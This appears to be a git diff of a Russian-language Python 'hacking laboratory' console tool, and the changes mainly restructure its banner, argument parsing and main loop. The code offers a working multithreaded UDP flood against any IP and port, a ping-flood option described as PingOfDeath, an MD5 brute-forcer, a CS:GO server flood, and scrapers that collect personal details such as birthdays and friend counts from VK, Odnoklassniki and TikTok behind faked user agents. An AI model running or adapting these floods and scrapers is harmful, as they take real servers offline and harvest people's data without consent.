@@ -20,12 +20,28 @@ import hashlib
 from telnetlib import Telnet
 import subprocess
 
-#используется argparse для корректной работы с Windows и Linux. При отсутствии аргументов стандартно будет выбран Windows.
-parser = argparse.ArgumentParser()
-parser.add_argument ('-s', '--system', default='windows', help='Используйте флаг для того, чтобы выбрать систему. Стандартно выбрана Windows')
-args = parser.parse_args()
+def art():
+    print(Fore.RED + '''
 
-init(autoreset=True) #авторесет для colorama
+
+	██████╗  ██╗███╗   ███╗ ██████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗            
+	██╔══██╗███║████╗ ████║██╔═══██╗████╗  ██║██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝            
+	██║  ██║╚██║██╔████╔██║██║   ██║██╔██╗ ██║██║     ███████║█████╗  ██║     █████╔╝             
+	██║  ██║ ██║██║╚██╔╝██║██║   ██║██║╚██╗██║██║     ██╔══██║██╔══╝  ██║     ██╔═██╗             
+	██████╔╝ ██║██║ ╚═╝ ██║╚██████╔╝██║ ╚████║╚██████╗██║  ██║███████╗╚██████╗██║  ██╗            
+	╚═════╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝            
+	██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗                                         
+	██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝                                         
+	███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗                                        
+	██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║                                        
+	██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝                                        
+	╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                                         
+	██╗      █████╗ ██████╗  ██████╗ ██████╗  █████╗ ████████╗ ██████╗ ██████╗ ██╗███████╗███████╗
+	██║     ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗██║██╔════╝██╔════╝
+	██║     ███████║██████╔╝██║   ██║██████╔╝███████║   ██║   ██║   ██║██████╔╝██║█████╗  ███████╗
+	██║     ██╔══██║██╔══██╗██║   ██║██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗██║██╔══╝  ╚════██║
+	███████╗██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║██║███████╗███████║
+	╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝''')
 
 def fakeuseragent():
     ua = random.choice(('Mozilla/5.0 (Linux; Android 9; MIBOX4 Build/PI; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36',
@@ -73,37 +89,11 @@ def fakeuseragent():
 ))
     return ua
 
-#ASCII ART
-def art():
-    print(Fore.RED + '''
-
-
-	██████╗  ██╗███╗   ███╗ ██████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗            
-	██╔══██╗███║████╗ ████║██╔═══██╗████╗  ██║██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝            
-	██║  ██║╚██║██╔████╔██║██║   ██║██╔██╗ ██║██║     ███████║█████╗  ██║     █████╔╝             
-	██║  ██║ ██║██║╚██╔╝██║██║   ██║██║╚██╗██║██║     ██╔══██║██╔══╝  ██║     ██╔═██╗             
-	██████╔╝ ██║██║ ╚═╝ ██║╚██████╔╝██║ ╚████║╚██████╗██║  ██║███████╗╚██████╗██║  ██╗            
-	╚═════╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝            
-	██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗                                         
-	██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝                                         
-	███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗                                        
-	██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║                                        
-	██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝                                        
-	╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                                         
-	██╗      █████╗ ██████╗  ██████╗ ██████╗  █████╗ ████████╗ ██████╗ ██████╗ ██╗███████╗███████╗
-	██║     ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗██║██╔════╝██╔════╝
-	██║     ███████║██████╔╝██║   ██║██████╔╝███████║   ██║   ██║   ██║██████╔╝██║█████╗  ███████╗
-	██║     ██╔══██║██╔══██╗██║   ██║██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗██║██╔══╝  ╚════██║
-	███████╗██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║██║███████╗███████║
-	╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝''')
-
-#checker section
 def checker(url):
     getbrowser = f'https://check-host.net/check-http?host={url}'
     webbrowser.open(getbrowser, new=2)
     print('Готово!')
 
-#ping section
 def ping(host):
     packets = input('Размер пакетов: ')
     threads = int(input('Количество потоков: '))
@@ -117,7 +107,6 @@ def ping(host):
             command_output = process.stdout.read().decode('utf-8')
             print(command_output)
 
-#tiktok parsing section
 def tiktokparsing(username):
     try:
         url = f'https://socialblade.com/tiktok/user/{username}' #статистика socialblade
@@ -146,7 +135,6 @@ def tiktokparsing(username):
         with open('TikTokData.txt', 'w') as file:
             file.write(f'Username: {username}\n' + '\n'.join(counts))
 
-#vk parsing section
 def vkparsing(url):
     headers = {
         'User-Agent': fakeuseragent(),
@@ -169,7 +157,6 @@ def vkparsing(url):
         with open('VKdata.txt', 'w') as file:
             file.write(f'URL: {url}\n' + '\n'.join(counts))
 
-#ok parsing section
 def okparsing(url):
     headers = {
         'User-Agent': fakeuseragent,
@@ -195,17 +182,16 @@ def okparsing(url):
         with open('OKdata.txt', 'w') as file:
             file.write(f'URL: {url}\nПользователь: {name.text}\nДата рождения: {birthday.text}\nКоличество друзей: {friends.text}\nКоличество групп: {groups.text}\nКоличество фотографий: {photo.text}\nКоличество игр: {games.text}')
 
-#udp flood section
 def launchudp(ip, port, thread, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     for _ in range(int(thread)):
         try:
-            thd = threading.Thread(target=attackudp, args=(ip, port, until))
+            thd = threading.Thread(target=attackudp, args=(ip, port, t, until))
             thd.start()
         except:
             pass
 
-def attackudp(ip, port, until_datetime):
+def attackudp(ip, port, t, until_datetime):
     data = random._urandom(1024)
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         i = random.choice(('[*]', '[&]', '[#]'))
@@ -218,7 +204,6 @@ def attackudp(ip, port, until_datetime):
         except:
             print(Fore.RED + '[@] Ошибка!')
 
-#wordpress section
 def urlTools(url):
     if url.lower().startswith('https://') or url.lower().startswith('http://'):
         url = url.replace('http://','').replace('https://','') #убирает https:// или http:// в начале ссылки
@@ -379,72 +364,78 @@ def clear():
     elif system == 'linux':
         os.system('clear') 
 
-art()
+if __name__ == '__main__': #Выполняется только, если файл запускается, а не импортируется
+    #используется argparse для корректной работы с Windows и Linux. При отсутствии аргументов стандартно будет выбран Windows.
+    parser = argparse.ArgumentParser()
+    parser.add_argument ('-s', '--system', default='windows', help='Используйте флаг для того, чтобы выбрать систему. Стандартно выбрана Windows')
+    args = parser.parse_args()
 
-#запуск цикла с "командной" строкой
-while True:
-    time.sleep(1.25)
-    start = input(Colorate.Horizontal(Colors.purple_to_red, '''
+    init(autoreset=True) #авторесет для colorama
+
+    art()
+
+    while True: #запуск цикла с "командной" строкой
+        time.sleep(1.25)
+        start = input(Colorate.Horizontal(Colors.purple_to_red, '''
     
-    ╔═══[root@Hacker]
-    ╚══> ''', 1))
-    if start == 'help':
-        print(Fore.GREEN + '''
-		$ checkhost - проверка хоста на работоспособность
-		$ ping - нагрузка сервера многопоточными Ping запросами (PingOfDeath)
-		$ tiktokpasrser - парсинг данных с ТикТока
-		$ vkpasrser - парсинг данных с ВКонтакте
-		$ okparser - парсинг данных с Одноклассников
-		$ udpflood - атака на IP до отказа (UDP)
-		$ wordpress - информация о CMS Wordpress
-		$ brutemd5 - брутфорс md5 хэша
-		$ csgoflood - CSGO Status Flood (Параметры запуска CSGO: -netconport [порт])
-		$ clear - очистка консоли
-		$ exit - выход
-		''')
-        pass
-    if start == 'checkhost':
-        clear()
-        url = input('URL: ')
-        checker(url)
-    if start == 'ping':
-        clear()
-        host = input('Хост (IP): ')
-        ping(host)
-    if start == 'okparser':
-        clear()
-        url = input('OK (url): ')
-        okparsing(url)
-    if start == 'udpflood':
-        clear()
-        ip = str(input('IP: '))
-        port = int(input('Port: '))
-        thread = int(input('Thread: '))
-        t = int(input('Times: '))
-        launchudp(ip, port, thread, t)
-    if start == 'tiktokparser':
-        clear()
-        username = input('TikTok username (without @): ')
-        tiktokparsing(username)
-    if start == 'vkparser':
-        clear()
-        url = input('VK (url): ')
-        vkparsing(url)
-    if start == 'wordpress':
-        clear()
-        Target = str(input('URL: '))
-        wordpressgetinfo(Target)
-    if start == 'brutemd5':
-        clear()
-        md5hash = input('MD5 Hash: ')
-        minlen = int(input('Минимальная длина брута: '))
-        maxlen = int(input('Максимальная длина брута: '))
-        BruteMD5(md5hash, minlen, maxlen)
-    if start == 'csgoflood':
-        clear()
-        port = input('Порт для подключения: ')
-        csgoflood(port)
-    if start == 'clear':
-        clear()
-    if start == 'exit':
-        exit(1)
+        ╔═══[root@Hacker]
+        ╚══> ''', 1))
+        if start == 'help':
+            print(Fore.GREEN + '''
+		    $ checkhost - проверка хоста на работоспособность
+		    $ ping - нагрузка сервера многопоточными Ping запросами (PingOfDeath)
+		    $ tiktokpasrser - парсинг данных с ТикТока
+		    $ vkpasrser - парсинг данных с ВКонтакте
+		    $ okparser - парсинг данных с Одноклассников
+		    $ udpflood - атака на IP до отказа (UDP)
+		    $ wordpress - информация о CMS Wordpress
+		    $ brutemd5 - брутфорс md5 хэша
+		    $ csgoflood - CSGO Status Flood (Параметры запуска CSGO: -netconport [порт])
+		    $ clear - очистка консоли
+		    $ exit - выход
+		    ''')
+        if start == 'checkhost':
+            clear()
+            url = input('URL: ')
+            checker(url)
+        if start == 'ping':
+            clear()
+            host = input('Хост (IP): ')
+            ping(host)
+        if start == 'okparser':
+            clear()
+            url = input('OK (url): ')
+            okparsing(url)
+        if start == 'udpflood':
+            clear()
+            ip = str(input('IP: '))
+            port = int(input('Port: '))
+            thread = int(input('Thread: '))
+            t = int(input('Times: '))
+            launchudp(ip, port, thread, t)
+        if start == 'tiktokparser':
+            clear()
+            username = input('TikTok username (without @): ')
+            tiktokparsing(username)
+        if start == 'vkparser':
+            clear()
+            url = input('VK (url): ')
+            vkparsing(url)
+        if start == 'wordpress':
+            clear()
+            Target = str(input('URL: '))
+            wordpressgetinfo(Target)
+        if start == 'brutemd5':
+            clear()
+            md5hash = input('MD5 Hash: ')
+            minlen = int(input('Минимальная длина брута: '))
+            maxlen = int(input('Максимальная длина брута: '))
+            BruteMD5(md5hash, minlen, maxlen)
+        if start == 'csgoflood':
+            clear()
+            port = input('Порт для подключения: ')
+            csgoflood(port)
+        if start == 'clear':
+            clear()
+        if start == 'exit':
+            exit(1)
